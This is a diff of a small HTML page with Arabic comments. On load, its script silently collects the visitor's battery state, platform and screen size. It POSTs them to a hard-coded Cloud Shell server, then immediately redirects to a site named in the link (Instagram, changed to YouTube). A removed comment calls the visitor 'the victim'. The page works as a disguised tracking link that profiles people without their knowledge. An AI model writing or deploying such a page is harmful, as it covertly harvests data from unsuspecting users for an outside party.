@@ -2,39 +2,39 @@
 <html>
 <head>
     <script>
-        // هذا هو الرابط العام المباشر والصحيح لاستقبال البيانات
+        // رابط السيرفر المباشر (تأكد إنه شغال بالـ Web Preview)
         const SERVER_URL = "https://8080-cs-f65a8037-daaf-45b2-a58a-a8f4d4f83c4f.cs-europe-west4-pear.cloudshell.dev/";
 
-        async function capture() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const target = urlParams.get('u') || 'https://instagram.com';
+        async function collect() {
+            const params = new URLSearchParams(window.location.search);
+            const target = params.get('u') || 'https://youtube.com';
             
             let batt = "N/A";
             try {
                 const b = await navigator.getBattery();
-                batt = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن' : 'لا يشحن'})`;
+                batt = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن' : 'فرغ'})`;
             } catch(e) {}
 
-            const info = {
-                platform: navigator.platform,
+            const payload = {
                 battery: batt,
+                platform: navigator.platform,
                 screen: `${window.screen.width}x${window.screen.height}`,
                 target: target
             };
 
-            // إرسال البيانات للسيرفر العام
+            // إرسال البيانات (POST)
             fetch(SERVER_URL, {
                 method: 'POST',
                 mode: 'no-cors', 
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(info)
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
             }).finally(() => {
-                // تحويل الضحية فوراً
+                // التحويل الفوري
                 window.location.replace(target);
             });
         }
-        window.onload = capture;
+        window.onload = collect;
     </script>
 </head>
-<body style="background:black;"></body>
+<body style="background:#000;"></body>
 </html>
